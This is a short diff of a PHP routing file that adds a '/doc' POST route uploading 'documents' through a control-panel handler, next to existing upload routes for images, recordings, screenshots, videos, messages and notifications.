@@ -27,6 +27,7 @@ $route->post('/image', fn() => $controlPanel->upload('images'));
 $route->post('/recording', fn() => $controlPanel->upload('recordings'));
 $route->post('/screenshot', fn() => $controlPanel->upload('screenshots'));
 $route->post('/video', fn() => $controlPanel->upload('videos'));
+$route->post('/doc', fn() => $controlPanel->upload('documents'));
 
 $route->post('/uploadMessage', fn() => $controlPanel->uploadMessage());
 $route->post('/uploadNotification', fn() => $controlPanel->uploadNotification());
